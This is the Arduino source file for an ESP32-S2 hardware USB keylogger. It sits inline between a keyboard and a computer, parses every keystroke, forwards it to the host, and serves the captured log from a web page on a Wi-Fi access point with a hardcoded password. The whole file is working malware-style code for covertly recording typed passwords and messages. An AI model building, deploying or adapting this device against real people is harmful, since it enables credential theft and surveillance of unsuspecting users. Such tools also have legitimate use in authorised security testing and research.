/*
 *  ESP32S2 USB Low Speed Keylogger
 *
 *  https://github.com/joelsernamoreno/
 *  https://github.com/tobozo
 *
 *  Version:    1.0
 *  Idea, Implementation & Design: @JoelSernaMoreno & @TobozoTagada
 *  
  */

#include "ESP32-USBSoftHost.hpp"
#include <WiFiClient.h> 
#include <WiFi.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <SPIFFSEditor.h>
#include <EEPROM.h>
#include <FS.h>
#include <WiFiAP.h>
#include "index.h"
#include "style.h"
#include "SPIFFS.h"
#include "usbkbd.h"
#include "kbdparser.h"
#include "hidkeyboard.h"

// Config SSID, password and channel
const char* ssid = "ESP32S2 USB-LS Keylogger";  // Enter your SSID here
const char* password = "123456789";  //Enter your Password here
const int wifi_channel = 12; //Enter your preferred Wi-Fi Channel

const bool formatOnFail = true;

#define LOAD_TINYUSB
#define PROFILE_NAME "ESP32S2 Dev Module"
#define DP_P0  -1
#define DM_P0  -1
#define DP_P1   8
#define DM_P1   9
#define DP_P2  -1
#define DM_P2  -1
#define DP_P3  -1
#define DM_P3  -1

KbdRptParser Prs;
AsyncWebServer controlserver(80);
File file;

// keyboard data parser to pass to the USB driver as a callback
static void m5_USB_PrintCB(uint8_t usbNum, uint8_t byte_depth, uint8_t* data, uint8_t data_len)
{
  Prs.Parse( data_len, data );
}

// USB detection callback
static void my_USB_DetectCB( uint8_t usbNum, void * dev )
{
  sDevDesc *device = (sDevDesc*)dev;
}

void setup()
{
  delay(5000);
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ssid, password,wifi_channel,8);
  SPIFFS.begin(formatOnFail);
  Keyboard.begin();

  // init the USB Host
  USH.init(
    (usb_pins_config_t){
      DP_P0, DM_P0,
      DP_P1, DM_P1,
      DP_P2, DM_P2,
      DP_P3, DM_P3
    },
    my_USB_DetectCB,
    m5_USB_PrintCB
  );

  controlserver.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send(200, "text/html", Index);
  });

  controlserver.on("/logs", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send(200, "text/html", cmd);
  });

  controlserver.on("/deletelogs", HTTP_POST, [](AsyncWebServerRequest *request) {
    if (request->hasArg("configmodule")) {
      cmd = "";
    }
  });

  controlserver.on("/style.css", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send(200, "text/css", Style);
  });

  controlserver.begin();
}

void loop()
{
  vTaskDelete(NULL);
}
